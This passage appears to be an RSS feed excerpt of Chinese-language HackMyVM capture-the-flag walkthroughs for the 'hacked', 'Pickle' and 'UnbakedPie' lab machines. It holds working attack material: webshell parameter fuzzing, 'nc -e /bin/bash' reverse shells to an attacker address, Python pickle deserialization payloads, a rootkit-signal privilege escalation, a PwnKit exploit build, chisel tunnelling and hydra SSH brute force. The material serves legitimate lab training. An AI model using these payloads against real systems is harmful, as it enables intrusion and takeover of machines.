/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/hacked/reports/http_192.168.42.185/__24-12-01_18-09-55.txt

Target: http://192.168.42.185/

[18:09:55] Starting:
[18:10:13] 200 -   16B  - /robots.txt
[18:10:14] 302 -   62B  - /simple-backdoor.php  -&gt;  /
<br>┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# curl http://192.168.42.185/robots.txt
/secretnote.txt

┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# curl http://192.168.42.185//secretnote.txt
[X] Enumeration
[X] Exploitation
[X] Privesc
[X] Maintaining Access.
 |__&gt; Webshell installed.
 |__&gt; Root shell created.

-h4x0r

┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# curl http://192.168.42.185//simple-backdoor.php
I modified this webshell to only execute my secret parameter.
<br>收集到的信息<br>用户 h4x0r 
webshell    /simple-backdoor.php
执行参数 未知
<br><br>从收集的这些信息当中猜测Webshell的参数<br>
试了几个参数都不对。猜测可能是需要爆破才行<br>┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# ffuf -u http://192.168.42.185/simple-backdoor.php?FUZZ=id -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt |grep -v "Size: 62"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.42.185/simple-backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 302, Size: 115, Words: 12, Lines: 2, Duration: 19ms]
<br>获取到参数是 secret 之前有在网页试过这个参数。应该是302了导致没有显示出来<br>
抓包的话可以看到<br>
<img alt="Pasted image 20241201183435" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" referrerpolicy="no-referrer"><br>弹shell<br>nc -e /bin/bash 192.168.42.39 1111
nc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201111
<br>[18:42:48] Welcome to pwncat 🐈!                                                              __main__.py:164
[18:46:34] received connection from 192.168.42.185:36606                                           bind.py:84
[18:46:35] 192.168.42.185:36606: registered new host w/ db                                     manager.py:957
(local) pwncat$
(remote) www-data@hacked:/var/www/html$ whoami
www-data
(remote) www-data@hacked:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@hacked:/var/www/html$
<br><br>这靶机上gcc编译不了。找不到Ld<br>
可以尝试从其他版本相近的靶机编译后传过来。<br>
这里我就不尝试了<br>使用linpeas进行检测。也没有发现什么利用点<br>去看一下wp才发现原来这里存在Rootkit<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/m0nad/Diamorphine" target="_blank">https://github.com/m0nad/Diamorphine</a><br>kill -63 0 取消隐藏进程
lsmod 列出加载到内核中的模块
<br><img alt="Pasted image 20241201193026" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193026.png" referrerpolicy="no-referrer"><br>
可以看到确实安装了<a data-tooltip-position="top" aria-label="../../26-工具使用/Diamorphine使用" data-href="../../26-工具使用/Diamorphine使用" href="https://www.c1trus.top/26-工具使用/diamorphine使用.html" class="internal-link" target="_self" rel="noopener nofollow">Diamorphine</a> <br><a data-tooltip-position="top" aria-label="../../26-工具使用/Diamorphine使用" data-href="../../26-工具使用/Diamorphine使用" href="https://www.c1trus.top/26-工具使用/diamorphine使用.html" class="internal-link" target="_self" rel="noopener nofollow">海洛因</a>有一个特征<br>
<img alt="Pasted image 20241201193108" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201193108.png" referrerpolicy="no-referrer"><br>
我们发送信号64即可获取到root<br>(remote) www-data@hacked:/tmp$ kill -64 0
(remote) root@hacked:/tmp$ id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
<br>
(remote) root@hacked:/root$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:33 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVhackingthehacker

------------------------


remote) root@hacked:/home/h4x0r$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: hacked

PWNED DATE: Sun Dec  1 06:32:55 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root),33(www-data)

FLAG: HMVimthabesthacker

------------------------

]]></description><link>https://www.c1trus.top/24-渗透/hmv/34.hacked.html</link><guid isPermaLink="false">24-渗透/HMV/34.hacked.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[33.pickle]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ftp" data-href="#3. ftp" href="https://www.c1trus.top/about:blank#3._ftp" class="internal-link" target="_self" rel="noopener nofollow">3. ftp</a>
<br><a data-tooltip-position="top" aria-label="4. SNMP服务利用" data-href="#4. SNMP服务利用" href="https://www.c1trus.top/about:blank#4._SNMP服务利用" class="internal-link" target="_self" rel="noopener nofollow">4. SNMP服务利用</a>

<br><a data-tooltip-position="top" aria-label="4.1. snmpbulkwalk 获取数据" data-href="#4.1. snmpbulkwalk 获取数据" href="https://www.c1trus.top/about:blank#4.1._snmpbulkwalk_获取数据" class="internal-link" target="_self" rel="noopener nofollow">4.1. snmpbulkwalk 获取数据</a>


<br><a data-tooltip-position="top" aria-label="5. Pickle反序列化" data-href="#5. Pickle反序列化" href="https://www.c1trus.top/about:blank#5._Pickle反序列化" class="internal-link" target="_self" rel="noopener nofollow">5. Pickle反序列化</a>
<br><a data-tooltip-position="top" aria-label="6. PwnKit提权" data-href="#6. PwnKit提权" href="https://www.c1trus.top/about:blank#6._PwnKit提权" class="internal-link" target="_self" rel="noopener nofollow">6. PwnKit提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Pickle" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Pickle</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=0xEEX75" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=0xEEX75" target="_blank">0xEEX75</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>
┌──(root㉿kali)-[~]
└─# fscan -h 192.168.80.7 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.7:21 open
192.168.80.7:1337 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://192.168.80.7:1337  code:401 len:90     title:None
[+] ftp 192.168.80.7:21:anonymous
   [-&gt;]init.py.bak
已完成 2/2
[*] 扫描结束,耗时: 1.329781452s

<br><br>
┌──(root㉿kali)-[/home/kali/hmv/pickle]
└─# ftp 192.168.80.7
Connected to 192.168.80.7.
220 (vsFTPd 3.0.3)
Name (192.168.80.7:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||7642|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 12  2020 .
drwxr-xr-x    2 0        0            4096 Oct 12  2020 ..
-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak
226 Directory send OK.
ftp&gt; get init.py.bak
local: init.py.bak remote: init.py.bak
229 Entering Extended Passive Mode (|||31068|)
150 Opening BINARY mode data connection for init.py.bak (1306 bytes).
100% |************************************************************|  1306      116.72 KiB/s    00:00 ETA
226 Transfer complete.
1306 bytes received in 00:00 (113.68 KiB/s)
ftp&gt; exit
221 Goodbye.

┌──(root㉿kali)-[/home/kali/hmv/pickle]
└─# ls
init.py.bak
<br>init.py<br>from functools import wraps
from flask import *
import hashlib
import socket
import base64
import pickle
import hmac

app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

@app.route('/', methods=["GET", "POST"])
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
def reset_page():
        '''
                __reset_page__()
        '''
        pass


@app.route('/checklist', methods=["GET", "POST"])
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")

if __name__ == '__main__':
        app.run(host='0.0.0.0', port=1337, debug=True)

<br>看一下网页<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" referrerpolicy="no-referrer"><br>
Gpt分析<br>
<img alt="585" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215318.png" referrerpolicy="no-referrer"><br>
主要漏洞就是在 / 与 /checklist 路由上<br>
提交的文件内容可以被我们控制<br>
反序列化p1的内容也可以被我们控制
<br><br>我们目前访问不了这个路由。因为有验证<br>
这时候可以尝试一下扫描udp协议<br>┌──(root㉿kali)-[/home/kali/hmv/pickle]
└─# nmap -sU 192.168.80.7 --top-ports 20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 22:25 CST
Nmap scan report for 192.168.80.7
Host is up (0.00024s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown
MAC Address: 08:00:27:8B:9A:A4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds

<br>可以发现 snmp服务 是开放的<br>
snmp的相关信息可以<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-snmp" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-snmp" target="_blank">在这里</a>查看<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130224842.png" referrerpolicy="no-referrer"><br>
snmp的利用可以通过暴力破解社区字符串（community string），其中最常见的社区字符串是 public<br><br>┌──(root㉿kali)-[/home/kali/hmv/pickle]
└─# snmpbulkwalk -c public -v2c 192.168.80.7 .
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (415838) 1:09:18.38
iso.3.6.1.2.1.1.4.0 = STRING: "lucas:SuperSecretPassword123!"
iso.3.6.1.2.1.1.5.0 = STRING: "pickle"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
<br>里面可以看到一个像是账号密码的东西<br>
lucas:SuperSecretPassword123!<br>尝试一下 发现确实是账号密码<br>
利用账号密码成功通过认证<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130225142.png" referrerpolicy="no-referrer"><br><br>在 / 路由下 发送反序列化的payload<br>
然后在 /checklist 路由下post传参 check 值为我们payload的md5<br>import pickle, os, base64
	class P(object):
		def __reduce__(self):
			return (os.system,("nc -e /bin/bash 192.168.80.5 1234 ",))
print(pickle.dumps(P()))
<br>Warning
这里必须用Python2生成payload
<br>┌──(root㉿kali)-[/home/kali/hmv/pickle]
└─# python2 payload.py
cposix
system
p0
(S'nc -e /bin/bash 192.168.80.5 1234 '
p1
tp2
Rp3
.
<br>这里有一个bug。就是它接收你的payload后生成的md5与你自己计算的md5不同<br>
原因应该是系统的问题<br>
这里我们使用它给的md5计算方法计算md5<br>
如果我们要获取正确的md5 选择转为unix即可 然后再计算即可<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201001719.png" referrerpolicy="no-referrer"><br>#coding:utf-8
import os
import cPickle
import hashlib
import requests


class CommandExecute(object):
        def __reduce__(self):
                return (os.system, ('nc 192.168.80.5 1234 -e /bin/bash',))

convert_data = cPickle.dumps(CommandExecute())
convert_crypt = hashlib.md5(convert_data).hexdigest()
print("md5:"+convert_crypt)
print("convert_data:"+convert_data)
send_requests = requests.post('http://192.168.80.7:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
check_requests = requests.post('http://192.168.80.7:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
print(check_requests.text)

<br>监听 1234 端口获取shell<br>curl -u 'lucas:SuperSecretPassword123!' --basic http://192.168.80.7:1337/checklist -X POST --data 'check=f387dc63759af1e92868d3556f63ed9e'
<br><br>使用<a data-tooltip-position="top" aria-label="../../26-工具使用/LZS使用" data-href="../../26-工具使用/LZS使用" href="https://www.c1trus.top/26-工具使用/lzs使用.html" class="internal-link" target="_self" rel="noopener nofollow">LZS</a> 进行检测<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201004318.png" referrerpolicy="no-referrer"><br>wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
unzip main
cd CVE-2021-4034-main
make
./cve-2021-4034
<br>e25fd1b9248d1786551e3412adc74f6f
7a32c9739cc63ed983ae01af2577c01c
<br>最后看一下完整的 project.py<br>app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

def check_auth(username, password):
       """This function is called to check if a username /
       password combination is valid.
       """
       return username == 'lucas' and password == 'SuperSecretPassword123!'

def authenticate():
       """Sends a 401 response that enables basic auth"""
       return Response(
       'Could not verify your access level for that URL.\n'
       'You have to login with proper credentials', 401,
       {'WWW-Authenticate': 'Basic realm="Pickle login"'})

def requires_auth(f):
       @wraps(f)
       def decorated(*args, **kwargs):
           auth = request.authorization
           if not auth or not check_auth(auth.username, auth.password):
               return authenticate()
           return f(*args, **kwargs)
       return decorated

@app.route('/', methods=["GET", "POST"])
@requires_auth
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
@requires_auth
def reset_page():
        '''
                __reset_page__()
        '''
        if request.method == "POST" and request.form["username"] and request.form["key"]:
                key    = "dpff43f3p214k31301"
                raw    = request.form["username"] + key + socket.gethostbyname(socket.gethostname())
                hashed = hmac.new(key, raw, hashlib.sha1)
                if request.form["key"] == hashed.hexdigest():
                        return base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))
        else:
                return "Server Error!"
        return render_template("reset.html")


@app.route('/checklist', methods=["GET", "POST"])
@requires_auth
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")

@app.route('/console')
@requires_auth
def secret_page():
        return "Server Error!"

if __name__ == '__main__':
        app.run(host='0.0.0.0', port=1337, debug=True)

]]></description><link>https://www.c1trus.top/24-渗透/hmv/33.pickle.html</link><guid isPermaLink="false">24-渗透/HMV/33.pickle.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241130215126.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[32.UnbakedPie]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. python反序列化" data-href="#3. python反序列化" href="https://www.c1trus.top/about:blank#3._python反序列化" class="internal-link" target="_self" rel="noopener nofollow">3. python反序列化</a>
<br><a data-tooltip-position="top" aria-label="4. docker逃逸&amp;提权" data-href="#4. docker逃逸&amp;提权" href="https://www.c1trus.top/about:blank#4._docker逃逸&amp;提权" class="internal-link" target="_self" rel="noopener nofollow">4. docker逃逸&amp;提权</a>
<br><a data-tooltip-position="top" aria-label="5. 端口转发 与SSH爆破" data-href="#5. 端口转发 与SSH爆破" href="https://www.c1trus.top/about:blank#5._端口转发_与SSH爆破" class="internal-link" target="_self" rel="noopener nofollow">5. 端口转发 与SSH爆破</a>

<br>[[#5.1. <a data-tooltip-position="top" aria-label="../../26-工具使用/chisel 使用" data-href="../../26-工具使用/chisel 使用" href="https://www.c1trus.top/26-工具使用/chisel-使用.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a> 搭建端口转发|5.1. <a data-tooltip-position="top" aria-label="../../26-工具使用/chisel 使用" data-href="../../26-工具使用/chisel 使用" href="https://www.c1trus.top/26-工具使用/chisel-使用.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a> 搭建端口转发]]
<br><a data-tooltip-position="top" aria-label="5.2. hydra爆破密码" data-href="#5.2. hydra爆破密码" href="https://www.c1trus.top/about:blank#5.2._hydra爆破密码" class="internal-link" target="_self" rel="noopener nofollow">5.2. hydra爆破密码</a>


<br><a data-tooltip-position="top" aria-label="6. 提权" data-href="#6. 提权" href="https://www.c1trus.top/about:blank#6._提权" class="internal-link" target="_self" rel="noopener nofollow">6. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=UnbakedPie" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=UnbakedPie</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[/home/kali/hmv/UnbakedPie]
└─# nmap -sS 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 17:53 CST

Nmap scan report for 192.168.56.27
Host is up (0.0010s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
5003/tcp open  filemaker
MAC Address: 08:00:27:10:44:F1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 959.54 seconds
<br>网站<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" referrerpolicy="no-referrer"><br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128183615.png" referrerpolicy="no-referrer"><br>Server WSGIServer/0.2 CPython/3.8.6<br>
Python写的<br>上面有一个搜索框<br>
抓包看看数据<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128202309.png" referrerpolicy="no-referrer"><br>
gA 开头 一眼 <a class="internal-link" data-href="../../20-网安/21-CTF/python/python反序列化.md" href="https://www.c1trus.top/20-网安/21-ctf/python/python反序列化.html" target="_self" rel="noopener nofollow">python反序列化</a><br>对这个进行解码看一下<br>import base64
a='gASVCgAAAAAAAACMBjEyMzEyM5Qu'
print(base64.b64decode(a))

输出
b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06123123\x94.'
<br>import pickle

p = b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06123123\x94.'
d = pickle.loads(p)
print(d)

输出
123123
<br><br>123123就是我们输入的明文搜索内容<br>那我们直接构建一个反弹shell的payload<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128230329.png" referrerpolicy="no-referrer"><br>import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("nc -e /bin/bash 192.168.80.5 1111 ",))
print(base64.b64encode(pickle.dumps(P())))

输出：
gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC44MC41IDExMTEglIWUUpQu
<br>Warning
这里一定要用Linux生成payload，因为其使用了 os.system 这个函数在linux与windows有所不同。所以要与靶机的系统相同。使用Linux生成payload
<br>┌──(root㉿kali)-[/home/kali/hmv/UnbakedPie]
└─# python payload.py
b'gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC44MC41IDExMTEglIWUUpQu'

<br>然后在这个位置随便搜索一下。抓个包替换掉 search_cookie<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120622.png" referrerpolicy="no-referrer"><br>
开启监听 发包 反弹shell<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120703.png" referrerpolicy="no-referrer"><br><br>进来后会发现自己是root权限<br>
但其实是在docker里面<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120834.png" referrerpolicy="no-referrer"><br>
可以在根目录看到有一个 .dockerenv 文件。这就是在容器里面的特征之一<br>上传 <a class="internal-link" data-href="../../26-工具使用/CDK使用.md" href="https://www.c1trus.top/26-工具使用/cdk使用.html" target="_self" rel="noopener nofollow">cdk</a> 进行检测<br>先看一下内核版本<br>(remote) root@8b39a559b296:/tmp# uname -a
Linux 8b39a559b296 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 GNU/Linux
<br>试了好几个发现都不能成功，还是在看看其他利用点吧<br>看一下历史记录<br>history
<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201135010.png" referrerpolicy="no-referrer"><br>
这里面可以看到容器进行了一个内网的ssh连接 用户名是 ramsey IP是 172.17.0.1<br>
这个ip可能就是主机IP <br>我们尝试进行ssh连接一下<br>(remote) root@8b39a559b296:/tmp# ssh ramsey@172.17.0.1
bash: ssh: command not found
<br>发现容器并没有安装ssh。 可能是已经杯卸载了<br>但是主机是不是开放了 ssh服务这对我们十分重要<br>
在开始进行端口扫描时 就可以发现主机只对外开放了5003端口 并没有22端口<br>
我们看看主机对内开放什么端口<br>(remote) root@8b39a559b296:/tmp# nc -znv 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 5003 (?) open
(UNKNOWN) [172.17.0.1] 22 (ssh) open
<br>可以看到对内是开放了ssh服务的<br><br>此时我们知道了主机 ssh的用户名与ip<br>
那么我们这时候只需要搭建一个容器与kali的隧道，使得主机可以访问容器内网，然后在kali上进行ssh爆破即可<br><br>使用kali给容器传一个<a data-tooltip-position="top" aria-label="../../26-工具使用/chisel 使用" data-href="../../26-工具使用/chisel 使用" href="https://www.c1trus.top/26-工具使用/chisel-使用.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a><br>kali开启反向监听<br>┌──(root㉿kali)-[/home]
└─# ./chisel server -p 9999 --reverse
2024/12/01 14:07:07 server: Reverse tunnelling enabled
2024/12/01 14:07:07 server: Fingerprint sP2BcLu3iBtJ8s51afwrmDlqpOsmsqVe64WNopPvgQM=
2024/12/01 14:07:07 server: Listening on http://0.0.0.0:9999

<br>容器连接并配置反向端口转发<br>(remote) root@8b39a559b296:/tmp# ./chisel client 192.168.80.5:9999 R:8888:172.17.0.1:22
2024/12/01 06:09:54 client: Connecting to ws://192.168.80.5:9999
2024/12/01 06:09:54 client: Connected (Latency 799.51µs)

<br>这时候访问就可以通过kali本地的 127.0.0.1:8888 访问到容器的 172.17.0.1:22<br><br>┌──(root㉿kali)-[/home/kali/hmv/UnbakedPie]
└─# hydra -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:8888
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-01 14:12:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://127.0.0.1:8888/
[8888][ssh] host: 127.0.0.1   login: ramsey   password: 12345678

<br>成功获取到密码 12345678<br>ssh连接获取flag<br>┌──(root㉿kali)-[/home/kali/hmv/UnbakedPie]
└─# ssh ramsey@127.0.0.1 -p 8888
The authenticity of host '[127.0.0.1]:8888 ([127.0.0.1]:8888)' can't be established.
ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:8888' (ED25519) to the list of known hosts.
ramsey@127.0.0.1's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


